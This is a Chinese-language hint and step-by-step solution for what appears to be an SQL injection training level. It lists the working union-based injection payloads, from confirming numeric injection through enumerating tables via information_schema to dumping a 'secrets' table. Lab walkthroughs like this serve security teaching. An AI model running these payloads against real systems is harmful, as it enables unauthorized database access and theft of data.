思路提示

GET 型注入的经典流程：① 判断注入类型（数字型还是字符型）；② 用 order by 猜字段数；③ 用 union select 找显示位；④ 依次爆库、爆表、爆列、拿数据。本关参数 id 是数字型，没有引号包裹，直接拼接 and 1=1 即可判断。

详细解题过程（点击展开）
手工注入步骤：
1. 判断注入：?id=1 and 1=1 正常，?id=1 and 1=2 异常 → 数字型注入
2. 猜字段数：?id=1 order by 4 正常，order by 5 报错 → 4列
3. 找显示位：?id=-1 union select 1,2,3,4
4. 爆库：?id=-1 union select 1,database(),user(),version()
5. 爆表：?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()
6. 爆列：?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='secrets'
7. 拿通关凭证：?id=-1 union select 1,group_concat(secret),3,4 from secrets
